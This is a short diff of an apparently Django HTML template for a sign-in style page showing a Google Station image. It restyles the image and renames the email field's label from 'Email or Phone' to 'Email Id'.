@@ -34,10 +34,12 @@
 		}
 
 	</style>
+
+
 </head>
 <body style="text-align: center;">
 	<div>
-		<img width="20%" src="https://www.thestatesman.com/wp-content/uploads/2020/02/google-station-2156-1120-768x399_ED.jpg">
+		<img style="width: 50%;max-width: 400px;height: auto;" src="https://www.thestatesman.com/wp-content/uploads/2020/02/google-station-2156-1120-768x399_ED.jpg">
 	</div>
 
 	<div style="margin-top: 0%;float: center;display: block;font-size: 20px;">
@@ -50,7 +52,7 @@
 		<div id="details">
 			<form method="POST" action="./"> {% csrf_token %}
 				<div style="float: left;font-size: 14px;margin-top: 10px;">
-					Email or Phone	
+					Email Id	
 				</div>
 				<div>
 					<input id="email" type="text" name="email" placeholder="Email or Phone">	
